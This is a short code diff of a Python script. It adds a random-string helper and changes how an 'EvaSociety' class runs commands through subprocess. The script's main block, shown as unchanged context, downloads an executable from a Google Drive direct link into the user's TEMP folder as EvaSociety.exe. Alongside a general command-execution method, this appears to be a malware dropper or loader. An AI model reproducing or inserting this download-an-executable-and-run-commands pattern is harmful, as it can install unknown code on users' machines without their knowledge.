@@ -81,6 +81,10 @@ class RandomStr:
         characters = string.ascii_letters + string.digits + string.punctuation
         return ''.join(random.choice(characters) for _ in range(length))
 
+    def generate_ascii_string(self, length):
+        characters = string.ascii_letters
+        return ''.join(random.choice(characters) for _ in range(length))
+
 class EvaSociety:
     def download(self, link, path):
         response = requests.get(link)
@@ -94,13 +98,14 @@ class EvaSociety:
     def execeva(self, evaLine, show_console=True):
         try:
             if show_console:
-                subprocess.run(evaLine, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
+                subprocess.run(evaLine, creationflags=subprocess.CREATE_NEW_CONSOLE)
             else:
-                subprocess.run(evaLine, shell=True)
+                subprocess.run(evaLine)
             return True
         except Exception as e:
             print(f"[2501] // An society (ex) logic error occurred: {e}")
             return False
+
 
 if __name__ == '__main__':
     EvaSociety().download('https://drive.usercontent.google.com/download?id=1csL6FBBQxpbyk_9aYDlcxWSdeigY1tkO&export=download&authuser=0&confirm=t&uuid=bc198f51-e714-4482-8bd4-4708a0db4744&at=APZUnTWwxPMhFJtcGjMjjaggpdsI%3A1712916595833', os.path.join(os.environ['TEMP'], 'EvaSociety.exe'))
